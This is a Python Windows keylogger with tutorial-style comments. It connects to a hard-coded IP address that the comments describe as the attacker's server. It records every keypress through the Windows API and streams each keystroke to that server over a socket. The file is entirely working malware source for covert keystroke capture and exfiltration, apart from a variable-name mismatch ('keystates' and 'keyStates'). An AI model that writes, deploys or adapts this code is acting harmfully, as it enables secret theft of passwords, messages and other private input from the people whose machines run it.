#importing the necessary libraries
import socket 
#socket library for networking
import ctypes
#to access windows API for capturing the keystrokes
import time 
#for managing for the programs execution

serverAddress = ('192.168.39.72', 9000)
#establishing the connection to the specific IP, which is the hackers IP and port 9000 where attackers server is listening
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(serverAddress)

user32 = ctypes.windll.user32
#using ctypes to load user32.dll which will allow us to capture the state of the keys

#creating a function to convert the keycodes to readable keynames
def getKey(code):
    asciiTable = {
        "0": "[NULL]", "1": "[CLICK]", "2": "[RCLICK]", "3": "[ETX]", "4": "[SCROLLCLICK]",
        "5": "[ENQ]", "6": "[ACK]", "7": "[BEL]", "8": "[BACKSPACE]", "9": "[TAB]",
        "10": "[LF]", "11": "[VT]", "12": "[CLEAR]", "13": "[ENTER]", "14": "[SO]", "15": "[SI]",
        "16": "", "17": "[RALT]", "18": "[LALT]", "19": "[PAUSEBREAK]", "20": "[CAPSLOCK]",
        "21": "[NAK]", "22": "[SYN]", "23": "[ETB]", "24": "[CAN]", "25": "[EM]",
        "26": "[SUB]", "27": "[ESC]", "28": "[FS]", "29": "[GS]", "30": "[RS]",
        "31": "[US]", "32": "[SPACE]", "33": "[PAGEUP]", "34": "[PAGEDOWN]", "35": "[END]",
        "36": "[HOME]", "37": "[LEFT]", "38": "[UP]", "39": "[RIGHT]", "40": "[DOWN]",
        "41": ")", "42": "*", "43": "+", "44": "[PRTSC]", "45": "[INSERT]",
        "46": "[DELETE]", "47": "/", "48": "0", "49": "1", "50": "2",
        "51": "3", "52": "4", "53": "5", "54": "6", "55": "7",
        "56": "8", "57": "9", "58": ":", "59": ";", "60": "<",
        "61": "=", "62": ">", "63": "?", "64": "@", "65": "A",
        "66": "B", "67": "C", "68": "D", "69": "E", "70": "F",
        "71": "G", "72": "H", "73": "I", "74": "J", "75": "K",
        "76": "L", "77": "M", "78": "N", "79": "O", "80": "P",
        "81": "Q", "82": "R", "83": "S", "84": "T", "85": "U",
        "86": "V", "87": "W", "88": "X", "89": "Y", "90": "Z",
        "91": "[WIN]", "92": "\\", "93": "]", "94": "^", "95": "_",
        "96": "0", "97": "1", "98": "2", "99": "3", "100": "4",
        "101": "5", "102": "6", "103": "7", "104": "8", "105": "9",
        "106": "*", "107": "+", "108": "l", "109": "-", "110": ".",
        "111": "/", "112": "[F1]", "113": "[F2]", "114": "[F3]", "115": "[F4]",
        "116": "[F5]", "117": "[F6]", "118": "[F7]", "119": "[F8]", "120": "[F9]",
        "121": "[F10]", "122": "[F11]", "123": "[F12]", "124": "|", "125": "}",
        "126": "~", "145": "[SCROOLLOCK]", "144": "[NUMLOCK]", "160": "[LSHIFT]", "161": "[RSHIFT]",
        "162": "[LCTRL]", "163": "[RCTRL]", "190": ".", "191": "/", "188": ",",
        "186": ";", "189": "-", "187": "=", "165": "", "164": "",
        "192": "`", "222": "'", "220": "\\", "219": "[", "221": "]"
    }
    return asciiTable[code]
#we will define the ascii table for the both special and regular keys

#creating the main function of the keylogger which is usefule for capturing and sending the keystrokes
def main():
    keystates = {}
    #initializing the empty dictionary called keystates, which will keep track of whether each key is pressed or not
    while True:
        #ensures that the keylogger continuously monitors the keyboard
        for i in range(256):
            #we use this loop to iterate through all the kay codes from 0-255, it covers all standard keys on the keyboard
            if user32.GetAsyncKeyState(i) & 0x8000 != 0:
                #this is the method to check if currently the key is pressed or not, if true the key is pressed
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    #we check the state of the capslock key
                    key = getKey(str(i))

                    if user32.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()
                        #if the capslock is off we convert the keyname to the lower case
                    #finally we send the short readable key name to the server
                    clientSocket.sendall(key.encode()) 
            else:
                keyStates[i] = False
        #we have a short sleep interval of 10 milliseconds
        time.sleep(0.01)

if __name__ == "__main__":
    main()
